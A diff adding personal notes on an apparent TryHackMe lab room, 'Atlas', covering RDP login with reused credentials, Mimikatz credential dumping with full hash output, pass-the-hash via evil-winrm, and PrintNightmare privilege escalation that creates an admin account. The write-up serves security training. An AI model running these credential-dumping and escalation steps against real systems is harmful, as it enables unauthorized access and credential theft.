@@ -458,3 +458,463 @@ yep I did it, using burpsuite and curl :)
 ![[Pasted image 20230101223935.png]]
 ![[Pasted image 20230101224137.png]]
 ### Access VNC 🠖 RDP
+If you've reached this task then you should have user access to the machine -- congratulations!
+The access that we have just now is mildly revolting though. ThinVNC does not provide the nicest interface to use, and we struggle to use a lot of the functionality of the machine through it.
+Cast your mind back to our initial enumeration. Remember we found that Microsoft Remote Desktop Services were running on port 3389? Assuming we have the proper credentials, we can connect to this from Linux using a tool called `xfreerdp`.
+The syntax for using `xfreerdp` looks like this:
+`xfreerdp /v:10.10.196.63 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp`
+There's a bunch of stuff going on here, so let's break each switch down:
+-   `/v:10.10.196.63` -- this is where we specify what we want to connect to.
+-   `/u:USERNAME /p:PASSWORD` -- here we would substitute in a valid username/password combination.
+-   `/cert:ignore` -- RDP connections are encrypted. If our attacking machine doesn't recognise the certificate presented by the machine we are connecting to it will warn us and ask if we wish to proceed; this switch simply ignores that warning automatically.
+-   `+clipboard` -- this shares our clipboard with the target, allowing us to copy and paste between our attacking machine and the target machine.
+-   `/dynamic-resolution` lets us resize the GUI window, adjusting the resolution of our remote session automatically.
+-   `/drive:share,/tmp` -- our final switch, this shares our own `/tmp` directory with the target. This is an _extremely_ useful trick as it allows us to execute scripts and programs from our own machine without actually transferring them to the target (we will see this in action later!)
+Answer the questions below
+Most people take the easy option when it comes to passwords, which makes password reuse incredibly common.
+With that in mind, use `xfreerdp` to connect to the target over RDP.
+Use the same credentials you found in the previous task for VNC.
+```text
+┌──(kali㉿kali)-[~/CVE-2019-17662]
+└─$ xfreerdp /v:10.10.196.63 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
+[22:42:44:507] [1005300:1005309] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[22:42:44:507] [1005300:1005309] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[22:42:44:630] [1005300:1005309] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[22:42:44:630] [1005300:1005351] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [share] (static)
+[22:42:44:631] [1005300:1005309] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[22:42:44:631] [1005300:1005309] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
+[22:42:58:847] [1005300:1005351] [INFO][com.freerdp.channels.rdpdr.client] - registered device #1: share (type=8 id=1)
+
+adjusting for me
+```
+```text
+┌──(kali㉿kali)-[~/CVE-2019-17662]
+└─$ xfreerdp /v:10.10.196.63 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%
+```
+Awesome -- we have admin access! Now what do we do with it?
+The classic thing to do here would be to try to dump the password hashes from the machine. In a network scenario these could come in handy for lateral movement. They also give us a way to prove our access to a client as Windows ([Serious Sam](https://www.rapid7.com/blog/post/2021/07/21/microsoft-sam-file-readability-cve-2021-36934-what-you-need-to-know/) vulnerability aside) prevents anyone from accessing this information if they don't have the highest possible privileges.
+The most commonly used tool to dump password hashes on Windows is [Mimikatz](https://github.com/gentilkiwi/mimikatz) by the legendary [Benjamin Delpy](https://twitter.com/gentilkiwi/). The go-to tool for Windows post-exploitation: few tools are more iconic or more well-known than Mimikatz.
+Answer the questions below
+First up, let's get an up-to-date copy of Mimikatz to our attacking machine. The code for the tool is publicly available on Github, but fortunately for the sake of simplicity, there are also pre-compiled versions available for download.
+Go to the [releases page](https://github.com/gentilkiwi/mimikatz/releases) for Mimikatz and find the latest release at the top of the list. Download the file called `mimikatz_trunk.zip` to your attacking machine.
+_**Note:** Certain browsers block the repository as being malicious. You're a hacker -- of course it's malicious. Just continue to the page anyway: it's perfectly safe._
+Completed
+Make sure that the zip file is in your `/tmp` directory, then unzip it with `unzip mimikatz_trunk.zip`:
+Unzipping Mimikatz
+```shell-session
+pentester@attacker:/tmp$ unzip mimikatz_trunk.zip 
+Archive:  mimikatz_trunk.zip
+  inflating: kiwi_passwords.yar      
+  inflating: mimicom.idl             
+  inflating: README.md               
+   creating: Win32/
+  inflating: Win32/mimidrv.sys       
+  inflating: Win32/mimikatz.exe      
+  inflating: Win32/mimilib.dll       
+  inflating: Win32/mimilove.exe      
+  inflating: Win32/mimispool.dll     
+   creating: x64/
+  inflating: x64/mimidrv.sys         
+  inflating: x64/mimikatz.exe        
+  inflating: x64/mimilib.dll         
+  inflating: x64/mimispool.dll
+```
+Completed
+Now we can get to work!
+Switch back into your RDP session and (using the elevated Command Shell we obtained in the last task) execute the following command to start Mimikatz:
+`\\tsclient\share\x64\mimikatz.exe`
+If this is successful then you should get some pretty ASCII art and a new terminal prompt:
+Mimikatz Prompt
+```powershell
+PS C:\Windows\system32> \\tsclient\share\x64\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz #
+```
+Correct Answer
+When we start Mimikatz we usually have to execute two commands before we start dumping hashes:
+-    `privilege::debug` -- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
+-   `token::elevate` -- simply put, this takes us from our administrative shell with high privileges into a `SYSTEM` level shell with maximum privileges. This is something that we have a _right_ to do as an administrator, but that is not usually possible using normal Windows operations.
+With these commands executed, we are ready to dump some passwords hashes!
+Completed
+There are a variety of commands we _could_ use here, all of which do slightly different things. The command that we _will_ use is: `lsadump::sam`.
+When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list:
+Using Mimikatz
+```html
+.#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+---
+
+mimikatz # lsadump::sam
+Domain : GAIA
+SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
+Local SID : S-1-5-21-1966530601-3185510712-10604624
+
+SAMKey : 6e708461100b4988991ce3b4d8b1784e
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: [REDACTED]
+```
+Completed
+```text
+┌──(kali㉿kali)-[~]
+└─$ locate mimikatz.exe
+/home/kali/Downloads/learning_kerberos/mimikatz.exe
+/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
+/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cd /tmp
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ cp /home/kali/Downloads/learning_kerberos/mimikatz.exe mimikatz.exe
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ ls                 
+burp12619999519564320901.tmp
+burp1764061989733424759.tmp
+CVE-2021-1675
+hsperfdata_kali
+mimikatz.exe
+
+C:\Windows\system32>\\tsclient\share\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # toke::elevate
+ERROR mimikatz_doLocal ; "toke" module not found !
+
+        standard  -  Standard module  [Basic commands (does not require module name)]
+          crypto  -  Crypto Module
+        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
+        kerberos  -  Kerberos package module  []
+       privilege  -  Privilege module
+         process  -  Process module
+         service  -  Service module
+         lsadump  -  LsaDump module
+              ts  -  Terminal Server module
+           event  -  Event module
+            misc  -  Miscellaneous module
+           token  -  Token manipulation module
+           vault  -  Windows Vault/Credential module
+     minesweeper  -  MineSweeper module
+             net  -
+           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
+       busylight  -  BusyLight Module
+          sysenv  -  System Environment Value module
+             sid  -  Security Identifiers module
+             iis  -  IIS XML Config module
+             rpc  -  RPC control of mimikatz
+            sr98  -  RF module for SR98 device and T5577 target
+             rdm  -  RF module for RDM(830 AL) device
+             acr  -  ACR Module
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+676     {0;000003e7} 1 D 24790          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;001ffd0e} 1 F 2225029     GAIA\adm1n      S-1-5-21-1966530601-3185510712-10604624-1009    (13g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2261912     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : GAIA
+SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
+Local SID : S-1-5-21-1966530601-3185510712-10604624
+
+SAMKey : 6e708461100b4988991ce3b4d8b1784e
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : efd8f5fd23c3b910ef609e3e872276c8
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : CHANGE-MY-HOSTNAMEAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c3bfc4a1912ab98abb75ad9d11aa511e30673f6c495066a811032df9756b9f3e
+      aes128_hmac       (4096) : 6fbcc5a35c6507e1dd2c51521557b3b6
+      des_cbc_md5       (4096) : 9ba7cdb3972013cd
+    OldCredentials
+      aes256_hmac       (4096) : 9484aadacd6c5994aed633bf92b6b3db31c57c932d2cd84a7fa635a0b3262806
+      aes128_hmac       (4096) : cdda685dd630dd0796e5ddf38e22dce5
+      des_cbc_md5       (4096) : 08340db613fb46b5
+    OlderCredentials
+      aes256_hmac       (4096) : 50141e3b3b449512e393a66c32e7f89a131744eef5d8a3f6a8576919a810cda3
+      aes128_hmac       (4096) : 0d717b42dbaf77bb7248b4bebf8bb3a6
+      des_cbc_md5       (4096) : bc23a20170542f25
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : CHANGE-MY-HOSTNAMEAdministrator
+    Credentials
+      des_cbc_md5       : 9ba7cdb3972013cd
+    OldCredentials
+      des_cbc_md5       : 08340db613fb46b5
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : a1528cd40d99e5dfa9fa0809af998696
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
+      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
+      des_cbc_md5       (4096) : ce9b2cabd55df4ce
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : ce9b2cabd55df4ce
+
+RID  : 000003f0 (1008)
+User : Atlas
+  Hash NTLM: 95ab4a5008e6266db4124279bbf2d70c
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 9a29c51aca19edf492ca5543c224fd93
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GAIAAtlas
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 31b9d2630afe8409043cf0aff5d14cac90b2b12655be040bb11de51ca098ecaa
+      aes128_hmac       (4096) : f1907d517c4a8cc9cb5e2c4607a47f2c
+      des_cbc_md5       (4096) : f8efef5e3ece8076
+    OldCredentials
+      aes256_hmac       (4096) : ba311b1a6f964cdcb2988045aad04074458aab5264fdbdb394a6614476353350
+      aes128_hmac       (4096) : 1a8cb078c086419390f2dfc8e81e3e18
+      des_cbc_md5       (4096) : dff41c61ea4967c8
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GAIAAtlas
+    Credentials
+      des_cbc_md5       : f8efef5e3ece8076
+    OldCredentials
+      des_cbc_md5       : dff41c61ea4967c8
+
+RID  : 000003f1 (1009)
+User : adm1n
+  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : af8c2d6247a6b1051a42beddb0c59540
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GAIAadm1n
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c8c242756234f40bcc0f4fd115fde31bf7103b57f0a3e9d4b687878908132548
+      aes128_hmac       (4096) : 93b364e4c0918b89ac64d429ceb37283
+      des_cbc_md5       (4096) : bc3215971f7c4525
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GAIAadm1n
+    Credentials
+      des_cbc_md5       : bc3215971f7c4525
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ evil-winrm -i 10.10.196.63 -u Administrator -H "c16444961f67af7eea7e420b65c8c3eb" -N
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completion is disabled
+
+Info: Establishing connection to remote endpoint
+
+...
+```
+What is the Administrator account's NTLM password hash?
+*c16444961f67af7eea7e420b65c8c3eb*
+### Conclusion Final Thoughts
+Congratulations -- you hacked Atlas!
+This was a beginner box which has hopefully provided you with some skills which will prove useful as you progress in your hacking journey. We covered initial exploitation of outdated software, as well as exploiting the Windows PrintSpooler and dumping password hashes with Mimikatz.
+Kudos for completing the room: now go hack some more!
+Answer the questions below
+I hacked Atlas!
+
+## Privilege Escalation
+Windows exploitation is a massive topic which is complicated greatly by the common-place nature of various defence mechanisms -- Anti-Virus software being the most well-known of these. Exploiting an up-to-date Windows target with the default defences active is _far_ outwith the scope of this room, so we will assume that the Atlas server has had the defence mechanisms de-activated.
+At this point we would usually start to enumerate the target to look for privilege escalation opportunities (or potentially lateral movement opportunities in an Active Directory environment). [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [Seatbelt](https://github.com/GhostPack/Seatbelt) are prime examples of tools that we may wish to employ here; however, there are many other tools available, and manual enumeration is always a wise idea.
+That said, Windows enumeration can be daunting; there are hundreds of different vectors to consider. To keep this room simple, we will instead look at a set of exploits in the PrintSpooler service which are unpatched at the time of writing. PrintSpooler is notorious for privilege escalation vulnerabilities. It runs with the maximum available permissions (under the `NT AUTHORITY\SYSTEM` account) and is a popular target for vulnerability research. There have been many vulnerabilities found in this service in the past; however, one of the latest is referred to as "PrintNightmare".
+We will use PrintNightmare to elevate our privileges on this target.
+Answer the questions below
+There are many different implementations of PrintNightmare available. You are advised to use a [PowerShell version](https://github.com/calebstewart/CVE-2021-1675) written by [Caleb Stewart](https://twitter.com/calebjstewart) and [John Hammond](https://twitter.com/_JohnHammond).
+Completed
+Navigate to the `/tmp` directory of your attacking VM, then clone the [repository](https://github.com/calebstewart/CVE-2021-1675).
+Remember that `/drive:/tmp,share` argument in the `xfreerdp` command? It's about to come in useful.
+Completed
+Inside your RDP session, open a new PowerShell Window.
+Completed
+The repository that we downloaded contains a PowerShell (`.ps1`) script that needs to be imported.
+We can import it using:
+`. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1`
+_Make sure to include the dot at the start!_
+This uses dot-syntax to import any functions exposed by the script. We are using `\\tsclient\share` to reference the share that we created. This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!
+Completed
+Only one thing left to do: run the exploit!
+We can start the ball rolling by executing `Invoke-Nightmare`.
+Exploiting PrintNightmare
+```powershell
+PS C:\Users\Atlas> Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
+```
+Completed
+Notice that our payload mentions creating a new user called `adm1n` with a password of `P@ssw0rd`? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.
+Regardless, we can now make use of our brand new admin account!
+Completed
+We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, let's use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.
+The command is as follows:
+`Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n`
+Execute this in your PowerShell session and follow the steps to spawn a new PowerShell process as an Administrator!
+Completed
+Run the command `whoami /groups` in the new window. You should see `BUILTIN\Administrators` in the list of groups, and a line at the bottom of the output containing `Mandatory Label\High Mandatory Level`.
+whoami /groups
+```powershell
+PS C:\Windows\system32> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID         
+============================================================= ================ ============
+Everyone                                                      Well-known group S-1-1-0     
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114   
+BUILTIN\Administrators                                        Alias            S-1-5-32-544
+BUILTIN\Users                                                 Alias            S-1-5-32-545
+NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113
+LOCAL                                                         Well-known group S-1-2-0
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
+```
+These mean that you are running as an administrator with full access over the machine. Congratulations!
+```text
+git clone https://github.com/calebstewart/CVE-2021-1675.git
+```
+```text
+┌──(kali㉿kali)-[/tmp/CVE-2021-1675]
+└─$ ls
+CVE-2021-1675.ps1  nightmare-dll  README.md
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Atlas> . \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1
+
+Security warning
+Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your
+computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning
+message. Do you want to run \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1?
+[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R
+PS C:\Users\Atlas> Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
+PS C:\Users\Atlas> Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
+
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes                  
+============================================================= ================ ============ ===============================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288        
+
+:)
+```
+![[Pasted image 20230101230304.png]]
+
+## Flags / Answers
+- ![Screenshot showing the credential request from the server on port 8080](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/d7f6be9e81b3e889eca38922caceac18.png)
+
+## Notes / Lessons Learned
+[[NoSQL injection Basics]]
+
